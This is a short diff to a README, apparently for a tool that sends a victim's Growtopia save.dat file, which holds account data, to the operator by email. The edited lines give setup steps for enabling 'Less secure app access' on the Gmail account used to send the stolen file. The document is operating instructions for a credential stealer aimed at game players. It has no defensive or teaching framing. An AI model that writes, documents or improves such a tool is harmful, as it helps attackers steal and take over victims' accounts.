@@ -5,7 +5,7 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 
 ## **Do these steps before running the program**
 
-* Open your _gmail_'s **Security** part. [Here](https://myaccount.google.com/security "Google Search")
+* Open the _gmail_'s (That you use for sending the save.dat file) **Security** part. [Here](https://myaccount.google.com/security "Google Search")
 * Scroll down until you see _Less secure app access_.
 * Click to the button and open it.
 * If theres a Save Button, then click to the Save Button.
